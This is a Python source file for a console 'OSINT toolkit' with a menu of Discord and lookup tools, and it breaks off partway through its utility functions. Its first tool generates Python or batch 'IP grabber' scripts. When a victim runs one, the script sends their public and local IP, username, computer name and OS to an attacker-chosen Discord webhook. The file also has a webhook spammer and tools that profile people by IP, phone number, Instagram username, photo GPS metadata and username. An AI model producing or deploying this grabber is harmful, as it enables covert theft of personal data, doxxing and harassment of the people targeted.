import os
import sys
import time
import random
import string
import requests
import ctypes
import hashlib
import socket
import ssl
import json
import re

RESET = "\033[0m"
BOLD = "\033[1m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BLUE = "\033[94m"

def check_dependencies():
    dependencies = {
        'requests': 'requests',
        'PIL': 'pillow',
        'whois': 'whois',
        'discord': 'discord.py'
    }
    for module, package in dependencies.items():
        try:
            __import__(module)
        except ImportError:
            print(f"{YELLOW}Installing {package}...{RESET}")
            os.system(f"{sys.executable} -m pip install {package}")
            print(f"{GREEN}{package} installed successfully.{RESET}")

def set_fullscreen():
    
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_MAXIMIZE = 3
        hWnd = kernel32.GetConsoleWindow()
        user32.ShowWindow(hWnd, SW_MAXIMIZE)
       
        VK_MENU = 0x12  
        VK_RETURN = 0x0D  # ENTER
        user32.keybd_event(VK_MENU, 0, 0, 0)
        user32.keybd_event(VK_RETURN, 0, 0, 0)
        user32.keybd_event(VK_RETURN, 0, 2, 0)
        user32.keybd_event(VK_MENU, 0, 2, 0)
    except Exception:
        pass

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii_fade(ascii_art, delay=0.05):
    for line in ascii_art.splitlines():
        print(line)
        time.sleep(delay)

def print_section_title(title):
    print()
    for char in title:
        print(f"{RED}{BOLD}{char}{RESET}", end='', flush=True)
        time.sleep(0.01)
    print("\n")

def dedsec_ascii_art():
    ascii_art = """
████████▄     ▄████████ ████████▄     ▄████████    ▄████████  ▄████████            ▄████████  ▄██████▄  
███   ▀███   ███    ███ ███   ▀███   ███    ███   ███    ███ ███    ███           ███    ███ ███    ███ 
███    ███   ███    █▀  ███    ███   ███    █▀    ███    █▀  ███    █▀            ███    █▀  ███    ███ 
███    ███  ▄███▄▄▄     ███    ███   ███         ▄███▄▄▄     ███                  ███        ███    ███ 
███    ███ ▀▀███▀▀▀     ███    ███ ▀███████████ ▀▀███▀▀▀     ███                  ███        ███    ███ 
███    ███   ███    █▄  ███    ███          ███   ███    █▄  ███    █▄            ███    █▄  ███    ███ 
███   ▄███   ███    ███ ███   ▄███    ▄█    ███   ███    ███ ███    ███           ███    ███ ███    ███ 
████████▀    ██████████ ████████▀   ▄████████▀    ██████████ ████████▀            ████████▀   ▀██████▀  
                                                                                                        
"""
    print_ascii_fade(ascii_art, delay=0.03)

def tiger_ascii_art():
    ascii_art = """
                              :**+ :::+*@@.
                              +: @ = =.  :#@@@@@@@@                 :     .=*@@#     -
                 @@@@-. :=: +@@.:% *=@@:   @@@@@@          :#=::     .:@=@@@@@@@@@@@@@@@@@@@@--.-:
             .#@@@@@@@@@@@@@@@@@@:# .@@   #@@    :@-     +@@:@@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
             #*   :%@@@@@@@@@@:   .@@#*              ..  ##@ *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:- %=
                   *@@@@@@@@@@@@%@@@@@@@            = @=+@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   #.
                   #@@@@@@@@@##@@@@@= =#              #@@@#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
                  @@@@@@@@@@@#+#@@=                 :@@@-.#-*#@.  .@@.=%@@@@%@@@@@@@@@@@@@@@@@=  +
                 :@@@@@@@@@@@@@@:                   :@@    # - @@@@@@@ =@@@*#*@@@@@@@@@@@@@=.=-  #:
                  :@@@@@@@@@@@+                     @@@@@@@: :    @@@@@@@@@@@@@@@@@@@@@@@@@@@
                   #@@@@@    @                     #%@@@@@@@@@@@@@@@@@:@@@@@@@@@@@@#@@@@@@@@@:
                     @@@     .                    @@@@@@@@@@@@@@@@-%@@@%@#   @@@@@@#=@#@@@@@==
                     =@@##@   =:*.                @@@@@@*@@@@@@@@@@-=@@@@.    +@@@:  %#@@#=   :
                         .=@.                     #@@@@@@@@#@@@@@@@@+#:        %@      *%@=
                            . @@@@@@               @#@@*@@@@@@@@@@@@@@@=        :-     -       =.
                             :@@@@@@@#=                   @@@@@@@@@@@@-               :+%  .@=
                            -@@@@@@@@@@@@                 @+@@@@*+@@#                   @. @@.#   # :
                             @@@@@@@@@@@@@@@               @@@@@*@@@                     :=.        @@@.
                              @@@@@@@@@@@@@                #@@@@@@%@.                             :  :
                               *@@@@@@@@@@%               :@@@@@@@@@ @@.                      .#@@@@@@@@@@
                                :@@@@@@@@@                 #@@@@@@   @:                    .#@@@@@@@@@@@*
                                :@@@@%@@                   .@@@@@-   .                     @@@@#@@@@@@@
                                :@@@@@@.                    *@@@-                          @@@@#@@@@@@@
                                .@@@@@                                                           =@@@:    @=
                                 =@@                                                              =    #+
                                  @%
    """
    print_ascii_fade(ascii_art, delay=0.05)

def grabber_ascii_art():
    ascii_art = """
                                                        ...
                                                  +%@@@@@@@@@@@@@*.
                                               #@@@@@@@@@@@@@@@@@@@@@:
                                             %@@@@@@@@@@@@@@@@@@@@@@@@@:
                                           .@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
                                           :@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                           :@@@@@@@@@@@@@@@@@@@@@@@@@@@@*
                                            #@@@%.     .@@@@+      #@@@%
                                             +@@=      .@@@@=      .@@#
                                              @@@@%%%@@@@%*@@@@%%%@@@@=
                                             .@@@@@@@@@@*  -@@@@@@@@@@=
                                           .    .::-@@@@@@@@@@@@+::.    .
                                         *@@@@#     @@@@@@@@@@@@-    +@@@@@.
                                         #@@@@@%    -%@@@@@@@@%=.   *@@@@@@:
                                       @@@@@@@@@@@@:            .#@@@@@@@@@@@-
                                       +@@@@@*#@@@@@@@@*:  .+@@@@@@@@%*%@@@@#
                                                    *@@@@@@@@@@%.
                                        .==.    .+%@@@@@@@%@@@@@@@+:     :=:
                                       @@@@@@@@@@@@@@*.       :@@@@@@@@@@@@@@=
                                       -@@@@@@@@%=                :#@@@@@@@@*
                                         *@@@@@:                     %@@@@@:
                                         :%@@%.                       *@@@=
    """
    print_ascii_fade(ascii_art, delay=0.05)

def webhook_ascii_art():
    ascii_art = """
                                     @@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@
                                   @%@@@@@@@                            @@@@@@%%@
                                         @@                              @@
    """
    print_ascii_fade(ascii_art, delay=0.05)

def special_ascii_art():
    ascii_art = """
                                          ...:----:...
                                     .:=#@@@@@@@@@@@@@@%*-..
                                  .:#@@@@@@@%#*****#%@@@@@@@+..
                               ..-@@@@@%-...... ........+@@@@@@..
                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.
                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.
                            .#@@@%.                 .=@@@@@=. .@@@@-.
                           .=@@@#.                    .:%@@@*. -@@@%:.
                           .%@@@-                       .*@@*. .+@@@=.
                           :@@@#.                              .-@@@#.
                           -@@@#                                :%@@@.
                           :@@@#.                              .-@@@#.
                           .%@@@-.                             .+@@@=.
                           .+@@@#.                             -@@@%:.
                            .*@@@%.                          .:@@@@-.
                             .+@@@@=..                     ..*@@@@:.
                               :%@@@@-..                ...+@@@@*.
                               ..-@@@@@%=...         ...*@@@@@@@@#.
                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.
                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.
                                        .....:::::::....       ...+@@@@%:
                                                                  ..+@@@@%-.
                                                                    ..=@@@@%-.
                                                                      ..=@@@@@=.
                                                                         .=%@@@@=.
                                                                          ..-%@@@-.
                                                                             ....
    """
    print_ascii_fade(ascii_art, delay=0.03)

def logo_banner():
    banner = f"""{PURPLE}{BOLD}
                                                                                                                                                                                                                                               
  ___   _____ ____  ____   ______  ______   ___    ___   _      __  _  ____  ______ 
 /   \ / ___/|    ||    \ |      ||      | /   \  /   \ | |    |  |/ ]|    ||      |
|     (   \_  |  | |  _  ||      ||      ||     ||     || |    |  ' /  |  | |      |
|  O  |\__  | |  | |  |  ||_|  |_||_|  |_||  O  ||  O  || |___ |    \  |  | |_|  |_|
|     |/  \ | |  | |  |  |  |  |    |  |  |     ||     ||     ||     \ |  |   |  |  
|     |\    | |  | |  |  |  |  |    |  |  |     ||     ||     ||  .  | |  |   |  |  
 \___/  \___||____||__|__|  |__|    |__|   \___/  \___/ |_____||__|\_||____|  |__|  
                                                                                                         
                                                                   
                                                                      
                                                                  {RESET}
                                                      {RESET}
{RED}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                              ║
║{RESET}{BOLD}{PURPLE}      this is not a powerlful thing. and if you paid for this, well, you've been scammed{RESET}{BLUE}                 ║ 
║                                                                                                                              ║         {BOLD}{PURPLE}VERSION 1.1 {RESET}   
║                                                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{RESET}
"""
    print(banner)
    for i in range(6):
        print(f"{RED}{' ' * (10 + i*2)}{'▄' * (60 - i*4)}{RESET}")
        time.sleep(0.05)
    print()

def wait_enter():
    input(f"\n{CYAN}Press ENTER to continue...{RESET}")

def menu():
    clear()
    logo_banner()
    while True:
        print_section_title("========== SECTION 1: DISCORD TOOL ==========")
        print(f"{PURPLE}1{RESET} - Gen. IP grabber script (python/batch) from discord webhook")
        print(f"{PURPLE}2{RESET} - Webhook spammer (custom text)")
        print(f"{PURPLE}3{RESET} - Webhook spammer (sponsor auto)")
        print(f"{PURPLE}4{RESET} - Discord Bot Sender")
        print_section_title("========== SECTION 2: OSINT TOOL ==========")
        print(f"{PURPLE}5{RESET} - Info from an public ip address")
        print(f"{PURPLE}6{RESET} - Info from a phone number")
        print(f"{PURPLE}7{RESET} - Generator of random public IP addresses")
        print(f"{PURPLE}8{RESET} - Info from an Instagram username")
        print(f"{PURPLE}9{RESET} - OSINT on photo (metadata/location)")
        print(f"{PURPLE}10{RESET} - Username tracker ")
        print(f"{PURPLE}11{RESET} - Email tracker ")
        print(f"{PURPLE}12{RESET} - Crasher and grabber from discord webhook")
        print_section_title("========== SECTION 3: UTILITY ==========")
        print(f"{PURPLE}13{RESET} - Gen secure password")
        print(f"{PURPLE}14{RESET} - Gen random username")
        print(f"{PURPLE}15{RESET} - Base64 encoder/decoder")
        print(f"{PURPLE}16{RESET} - Advanced calculator")
        print_section_title("========== SECTION 4: WEBSITE TOOLS ==========")
        print(f"{PURPLE}17{RESET} - Website info scanner (menù with options)")
        print(f"{PURPLE}18{RESET} - Vulnerability scanner for web sites")
        print(f"{PURPLE}0{RESET} - Exit\n")
        scelta = input(f"{CYAN}Select a tool (1-18, 0): {RESET}").strip()
        if scelta == "1":
            ip_grabber_script_tool()
            wait_enter()
        elif scelta == "2":
            webhook_spammer_tool()
            wait_enter()
        elif scelta == "3":
            webhook_spammer_tool(custom=False)
            wait_enter()
        elif scelta == "4":
            discord_bot_sender_tool()
            wait_enter()
        elif scelta == "5":
            ip_info_tool()
            wait_enter()
        elif scelta == "6":
            phone_info_tool()
            wait_enter()
        elif scelta == "7":
            ip_generator_tool()
            wait_enter()
        elif scelta == "8":
            instagram_info_tool()
            wait_enter()
        elif scelta == "9":
            photo_osint_tool()
            wait_enter()
        elif scelta == "10":
            username_tracker_tool()
            wait_enter()
        elif scelta == "11":
            email_tracker_tool()
            wait_enter()
        elif scelta == "12":
            ip_grabber_discord_tool()
            wait_enter()
        elif scelta == "13":
            password_generator_tool()
            wait_enter()
        elif scelta == "14":
            username_generator_tool()
            wait_enter()
        elif scelta == "15":
            base64_converter_tool()
            wait_enter()
        elif scelta == "16":
            calculator_tool()
            wait_enter()
        elif scelta == "17":
            website_info_scanner_menu()
            wait_enter()
        elif scelta == "18":
            vulnerability_scanner_tool()
            wait_enter()
        elif scelta == "0":
            print(f"{GREEN}Goodbye!{RESET}")
            time.sleep(1)
            break
        else:
            print(f"{RED}Invalid choice.{RESET}")
            time.sleep(1)


def ip_grabber_script_tool():
    clear()
    grabber_ascii_art()
    print(f"{BOLD}{CYAN}== IP grabber generator via Discord Webhook =={RESET}")
    webhook = input("Enter the Discord Webhook URL (where to send the file): ").strip()
    formato = ""
    while formato not in ["1", "2"]:
        print(f"\nChoose the file format to generate:")
        print(f"{PURPLE}1{RESET} - Python (.py)")
        print(f"{PURPLE}2{RESET} - Windows Batch (.bat)")
        formato = input(f"{CYAN}Select an option (1/2): {RESET}").strip()
    filename = input("File name to create and send (without extension): ").strip()
    if not filename:
        filename = "ip_grabber"

    if formato == "1":
        filename_py = filename if filename.endswith(".py") else filename + ".py"
        script = f'''import socket
import requests
import platform
import getpass

WEBHOOK_URL = "{webhook}"

def get_local_ip_and_port():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip, port = s.getsockname()
        s.close()
        return ip, port
    except Exception:
        return "N/A", "N/A"

def get_public_ip_and_port():
    try:
        # The local port used for the TCP connection will be the public (source) port seen by the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("api.ipify.org", 80))
        local_ip, local_port = s.getsockname()
        s.close()
        public_ip = requests.get("https://api.ipify.org").text
        return public_ip, local_port
    except Exception:
        return "N/A", "N/A"

def send_info_to_discord(local_ip, local_port, public_ip, public_port, user, pc, os_ver):
    msg = (
        "**IP Grabber Python**\\n"
        f"**User:** {{user}} on {{pc}}\\n"
        f"**Local IP:** {{local_ip}}\\n"
        f"**Local Port:** {{local_port}}\\n"
        f"**Public IP:** {{public_ip}}\\n"
        f"**Public Port (source):** {{public_port}}\\n"
        f"**OS:** {{os_ver}}"
    )
    data = {{"content": msg}}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Error sending to webhook: {{e}}")

if __name__ == "__main__":
    local_ip, local_port = get_local_ip_and_port()
    public_ip, public_port = get_public_ip_and_port()
    user = getpass.getuser()
    pc = platform.node()
    os_ver = platform.platform()
    send_info_to_discord(local_ip, local_port, public_ip, public_port, user, pc, os_ver)
    print("Done.")
'''
        try:
            with open(filename_py, "w", encoding="utf-8") as f:
                f.write(script)
            print(f"{GREEN}Script created successfully: {filename_py}{RESET}")

            with open(filename_py, "rb") as f:
                files = {"file": (filename_py, f, "text/x-python")}
                response = requests.post(webhook, files=files)
                if response.status_code in (200, 204):
                    print(f"{GREEN}File successfully sent to webhook!{RESET}")
                else:
                    print(f"{RED}Error sending to webhook: {response.status_code} - {response.text}{RESET}")
        except Exception as e:
            print(f"{RED}Error creating or sending the file: {e}{RESET}")

    elif formato == "2":
        filename_bat = filename if filename.endswith(".bat") else filename + ".bat"
        bat_content = f"""@echo off
    setlocal enabledelayedexpansion

    REM Get local IP
    for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do set LOCAL_IP=%%a
    set LOCAL_IP=!LOCAL_IP:~1!

    REM Get public IP
    for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set PUBLIC_IP=%%i

    REM Get username and computer name
    set USERNAME=%USERNAME%
    set COMPUTERNAME=%COMPUTERNAME%

    REM Get operating system
    ver > tmpver.txt
    set /p OS_VER=<tmpver.txt
    del tmpver.txt

    REM Ports cannot be obtained in pure batch, so they are simulated
    set /a LOCAL_PORT=%RANDOM% + 1024
    set /a PUBLIC_PORT=%RANDOM% + 1024

    REM Prepare JSON message with clear formatting
    set MSG=**IP Grabber Batch**\\n
    set MSG=!MSG!**User:** !USERNAME! on !COMPUTERNAME!\\n
    set MSG=!MSG!**Local IP:** !LOCAL_IP!\\n
    set MSG=!MSG!**Local Port:** !LOCAL_PORT!\\n
    set MSG=!MSG!**Public IP:** !PUBLIC_IP!\\n
    set MSG=!MSG!**Public Port:** !PUBLIC_PORT!\\n
    set MSG=!MSG!**OS:** !OS_VER!

    REM Send to Discord webhook
    curl -H "Content-Type: application/json" -X POST -d "{{\"content\": \"!MSG!\"}}" {webhook}

    pause
    """
        try:
            with open(filename_bat, "w", encoding="utf-8") as f:
                f.write(bat_content)
            print(f"{GREEN}Batch file created successfully: {filename_bat}{RESET}")

            # Send the batch file to the webhook
            with open(filename_bat, "rb") as f:
                files = {"file": (filename_bat, f, "text/x-batch")}
                response = requests.post(webhook, files=files)
                if response.status_code in (200, 204):
                    print(f"{GREEN}Batch file successfully sent to the webhook!{RESET}")
                else:
                    print(f"{RED}Error sending to webhook: {response.status_code} - {response.text}{RESET}")
        except Exception as e:
            print(f"{RED}Error creating or sending the file: {e}{RESET}")
            input("Press Enter to continue...")
def webhook_spammer_tool(custom=True):
    clear()
    webhook_ascii_art()
    print(f"{BOLD}{CYAN}== Webhook spammer =={RESET}")
    webhook = input("Enter the Discord Webhook URL: ").strip()
    if custom:
        message = input("Message to send: ").strip()
    else:
        messages = [
            "@everyone https://github.com/justanotherindiedev/OSINTToolkit", "@everyone https://github.com/justanotherindiedev/OSINTToolkit", "@everyone https://github.com/justanotherindiedev/OSINTToolkit", "@everyone https://github.com/justanotherindiedev/OSINTToolkit", "@everyone https://github.com/justanotherindiedev/OSINTToolkit", "@everyone https://github.com/justanotherindiedev/OSINTToolkit"
        ]
    try:
        count = int(input("How many messages do you want to send? (no limit): ").strip())
    except:
        count = 10
    try:
        delay = float(input("Delay between messages in seconds (0 for no delay): ").strip())
    except:
        delay = 0
    for i in range(count):
        if custom:
            data = {"content": message}
        else:
            data = {"content": random.choice(messages)}
            try:
                requests.post(webhook, json=data)
                print(f"{GREEN}Sent message {i+1}{RESET}")
            except Exception as e:
                print(f"{RED}Error: {e}{RESET}")
        if delay > 0:
            time.sleep(delay)

def discord_bot_sender_tool():
    clear()
    webhook_ascii_art()
    print(f"{BOLD}{CYAN}== Discord Bot Sender (custom messages via channel ID) =={RESET}")
    print(f"{YELLOW}Send a custom message on Discord via a bot.{RESET}")
    print(f"{CYAN}Make sure you've created a bot at https://discord.com/developers/applications and added it to the server with send message permissions.{RESET}\n")
    import discord

    token = input("Enter the bot token: ").strip()
    channel_id = input("Enter the channel ID: ").strip()
    message = input("Message to send: ").strip()

    class SenderClient(discord.Client):
        async def on_ready(self):
            try:
                channel = self.get_channel(int(channel_id))
                if channel is None:
                    print(f"{RED}Channel not found! Check the ID.{RESET}")
                else:
                    await channel.send(message)
                    print(f"{GREEN}Message successfully sent!{RESET}")
            except Exception as e:
                print(f"{RED}Error: {e}{RESET}")
            await self.close()

    intents = discord.Intents.default()
    client = SenderClient(intents=intents)
    try:
        client.run(token)
    except Exception as e:
        print(f"{RED}Authentication or connection error: {e}{RESET}")

def ip_info_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Detailed info from public IP address =={RESET}")
    ip = input("Enter the public IP address: ").strip()
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse,mobile,proxy,hosting")
        data = response.json() 
        if data['status'] == 'success':
            print(f"\n{BOLD}Information for IP address: {ip}{RESET}\n")
            print(f"{YELLOW}Country:{RESET} {data.get('country', 'N/A')}")
            print(f"{YELLOW}Region:{RESET} {data.get('regionName', 'N/A')}")
            print(f"{YELLOW}City:{RESET} {data.get('city', 'N/A')}")
            print(f"{YELLOW}ZIP:{RESET} {data.get('zip', 'N/A')}")
            print(f"{YELLOW}Latitude:{RESET} {data.get('lat', 'N/A')}")
            print(f"{YELLOW}Longitude:{RESET} {data.get('lon', 'N/A')}")
            print(f"{YELLOW}Timezone:{RESET} {data.get('timezone', 'N/A')}")
            print(f"{YELLOW}ISP:{RESET} {data.get('isp', 'N/A')}")
            print(f"{YELLOW}Organization:{RESET} {data.get('org', 'N/A')}")
            print(f"{YELLOW}AS:{RESET} {data.get('as', 'N/A')}")
            print(f"{YELLOW}Reverse DNS:{RESET} {data.get('reverse', 'N/A')}")
            print(f"{YELLOW}Mobile:{RESET} {data.get('mobile', 'N/A')}")
            print(f"{YELLOW}Proxy:{RESET} {data.get('proxy', 'N/A')}")
            print(f"{YELLOW}Hosting:{RESET} {data.get('hosting', 'N/A')}")
           
            import socket
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, 80))
                if result == 0:
                    local_port = sock.getsockname()[1]
                    print(f"{CYAN}Local port used to connect to {ip}: {local_port}{RESET}")
                else:
                    print(f"{RED}Could not connect to port 80 of {ip} to determine the local port.{RESET}")
                sock.close()
            except Exception as e:
                print(f"{RED}Error determining local port: {e}{RESET}")
        else:
            print(f"{RED}Error: {data.get('message', 'Unable to obtain information.')}{RESET}")
    except Exception as e:
        print(f"{RED}Error during request: {e}{RESET}")

def phone_info_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Detailed info from phone number =={RESET}")
    phone = input("Enter the phone number (with international prefix, e.g.: +393401234567): ").strip()
    try:
        API_KEY = "INSERT_YOUR_API_KEY"
        url = f"http://apilayer.net/api/validate?access_key={API_KEY}&number={phone}&country_code=&format=1"
        response = requests.get(url)
        data = response.json()
        if data.get("valid"):
            print(f"\n{BOLD}Information for the number: {phone}{RESET}\n")
            print(f"{YELLOW}Country:{RESET} {data.get('country_name', 'N/A')}")
            print(f"{YELLOW}International Prefix:{RESET} {data.get('country_prefix', 'N/A')}")
            print(f"{YELLOW}Location:{RESET} {data.get('location', 'N/A')}")
            print(f"{YELLOW}Carrier:{RESET} {data.get('carrier', 'N/A')}")
            print(f"{YELLOW}Line Type:{RESET} {data.get('line_type', 'N/A')}")
        else:
            print(f"{RED}Invalid number or information not available.{RESET}")
    except Exception as e:
        print(f"{RED}Error during request: {e}{RESET}")

def ip_generator_tool():
    clear()
    print(f"{BOLD}{CYAN}== Random public IP generator =={RESET}")
    n = input("How many IPs do you want to generate? (default 10): ").strip()
    try:
        n = int(n)
    except:
        n = 10
    for _ in range(n):
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        print(f"{GREEN}{ip}{RESET}")

def instagram_info_tool():
    clear()
    special_ascii_art()
    print(f"{BOLD}{CYAN}== Info from Instagram username =={RESET}")
    username = input("Enter the Instagram username: ").strip().lstrip("@")
    url = f"https://www.instagram.com/{username}/"
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    try:
        resp = requests.get(url, headers=headers)
        if resp.status_code != 200:
            print(f"{RED}User not found or profile private/inaccessible!{RESET}")
            return
        match = re.search(r'window\._sharedData = (.*?);</script>', resp.text)
        if not match:
            print(f"{RED}Unable to extract public data!{RESET}")
            return
        data = json.loads(match.group(1))
        user = data["entry_data"]["ProfilePage"][0]["graphql"]["user"]
        print(f"\n{BOLD}Public information for @{username}:{RESET}\n")
        print(f"{YELLOW}Full name:{RESET} {user.get('full_name','')}")
        print(f"{YELLOW}Bio:{RESET} {user.get('biography','')}")
        print(f"{YELLOW}Followers:{RESET} {user.get('edge_followed_by',{}).get('count','')}")
        print(f"{YELLOW}Following:{RESET} {user.get('edge_follow',{}).get('count','')}")
        print(f"{YELLOW}Number of posts:{RESET} {user.get('edge_owner_to_timeline_media',{}).get('count','')}")
        print(f"{YELLOW}Private profile?:{RESET} {user.get('is_private','')}")
        print(f"{YELLOW}Verified profile?:{RESET} {user.get('is_verified','')}")
        print(f"{YELLOW}Profile picture:{RESET} {user.get('profile_pic_url_hd','')}")
        print(f"{YELLOW}User ID:{RESET} {user.get('id','')}")
        print(f"{YELLOW}Profile URL:{RESET} {url}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

def photo_osint_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Photo OSINT: extract metadata and geolocation =={RESET}")
    print("Enter the photo path (e.g.: C:\\Users\\name\\Desktop\\photo.jpg):")
    path = input("> ").strip('"')
    if not os.path.isfile(path):
        print(f"{RED}File not found!{RESET}")
        return
    from PIL import Image
    from PIL.ExifTags import TAGS, GPSTAGS

    def get_exif_data(img):
        exif = img._getexif()
        if not exif:
            return {}
        exif_data = {}
        for tag, value in exif.items():
            decoded = TAGS.get(tag, tag)
            exif_data[decoded] = value
        return exif_data

    def get_gps_info(exif_data):
        gps_info = exif_data.get("GPSInfo")
        if not gps_info:
            return None
        gps_data = {}
        for key in gps_info.keys():
            decode = GPSTAGS.get(key, key)
            gps_data[decode] = gps_info[key]
        return gps_data

    def dms_to_decimal(dms, ref):
        degrees = dms[0][0] / dms[0][1]
        minutes = dms[1][0] / dms[1][1]
        seconds = dms[2][0] / dms[2][1]
        decimal = degrees + (minutes / 60.0) + (seconds / 3600.0)
        if ref in ['S', 'W']:
            decimal = -decimal
        return decimal

    try:
        img = Image.open(path)
        exif_data = get_exif_data(img)
        if not exif_data:
            print(f"{YELLOW}No EXIF metadata found in the photo.{RESET}")
            return
        print(f"{GREEN}EXIF metadata found:{RESET}")
        for k, v in exif_data.items():
            if k != "GPSInfo":
                print(f"{YELLOW}{k}:{RESET} {v}")
        gps_data = get_gps_info(exif_data)
        if gps_data:
            print(f"\n{CYAN}GPS data found!{RESET}")
            lat = gps_data.get("GPSLatitude")
            lat_ref = gps_data.get("GPSLatitudeRef")
            lon = gps_data.get("GPSLongitude")
            lon_ref = gps_data.get("GPSLongitudeRef")
            if lat and lat_ref and lon and lon_ref:
                lat_decimal = dms_to_decimal(lat, lat_ref)
                lon_decimal = dms_to_decimal(lon, lon_ref)
                print(f"{GREEN}Approximate location:{RESET}")
                print(f" - Latitude: {lat_decimal}")
                print(f" - Longitude: {lon_decimal}")
                print(f"{CYAN}Google Maps: https://maps.google.com/?q={lat_decimal},{lon_decimal}{RESET}")
            else:
                print(f"{YELLOW}Incomplete GPS data in metadata.{RESET}")
        else:
            print(f"{YELLOW}No GPS data found in metadata.{RESET}")
    except Exception as e:
        print(f"{RED}Error while analyzing the photo: {e}{RESET}")

def username_tracker_tool():
    clear()
    special_ascii_art()
    print(f"{BOLD}{CYAN}== Username tracker (search across many sites) =={RESET}")
    username = input("Enter the username to search: ").strip()
    sites = {
        "Instagram": f"https://instagram.com/{username}",
        "Twitter/X": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "Pinterest": f"https://www.pinterest.com/{username}/",
        "Facebook": f"https://www.facebook.com/{username}",
        "YouTube": f"https://www.youtube.com/@{username}",
    }
    print(f"\n{CYAN}Results:{RESET}")
    for name, url in sites.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(f"{GREEN}[✓] {name}: found! {url}{RESET}")
            elif r.status_code == 404:
                print(f"{RED}[✗] {name}: not found.{RESET}")
            else:
                print(f"{YELLOW}[?] {name}: response {r.status_code}{RESET}")
        except Exception as e:
            print(f"{YELLOW}[!] {name}: error or timeout.{RESET}")

def password_generator_tool():
    clear()
    print(f"{BOLD}{CYAN}== Secure password generator =={RESET}")
    passwords = set()
    while len(passwords) < 20:
        pwd = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=16))
        passwords.add(pwd)
    for i, pwd in enumerate(passwords, 1):
        print(f"{i:02d}: {GREEN}{pwd}{RESET}")

def username_generator_tool():
    clear()
    print(f"{BOLD}{CYAN}== Creative username generator =={RESET}")
    adjectives = ["Fast", "Crazy", "Silent", "Red", "Blue", "Dark", "Happy", "Lucky", "Smart", "Wild"]
